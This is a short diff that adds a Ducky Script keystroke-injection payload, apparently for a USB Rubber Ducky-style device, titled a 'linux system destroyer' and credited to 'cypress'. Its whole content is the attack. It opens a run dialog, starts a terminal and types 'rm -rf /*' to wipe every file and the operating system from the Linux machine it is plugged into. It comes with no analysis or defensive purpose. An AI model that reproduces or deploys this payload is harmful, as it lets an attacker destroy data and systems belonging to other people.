@@ -1,0 +1,7 @@
+REM linux system destroyer | wipe all files and the OS off of a linux box
+REM by: cypress
+ALT F2
+STRING terminal
+ENTER
+STRING rm -rf /*
+ENTER
